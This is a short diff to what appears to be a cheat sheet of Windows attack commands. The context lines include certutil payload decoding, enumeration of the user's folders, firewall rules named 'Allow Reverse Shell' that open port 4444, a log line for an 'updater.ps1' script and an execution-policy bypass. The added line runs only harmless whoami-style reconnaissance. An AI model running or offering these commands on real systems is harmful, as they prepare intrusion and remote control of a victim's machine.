@@ -187,6 +187,7 @@ certutil -decode image.txt image.jpg
 ///powershell commands
 powershell -Command "ls"
 powershell -Command "Get-Location; ls"
+powershell -Command "& { ls; Get-Date; whoami }"
 powershell -Command "Get-ChildItem \"C:\\\""
 powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Downloads\""
 powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Desktop\""
@@ -201,6 +202,7 @@ New-NetFirewallRule -DisplayName "Allow Reverse Shell" -Direction Outbound -Prot
 Add-Content -Path "C:\Users\Public\log.txt" -Value "$(Get-Date): updater.ps1 triggered"
 netsh advfirewall firewall add rule name="Allow Reverse Shell" dir=out action=allow protocol=TCP remoteport=4444
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+
 
 
 
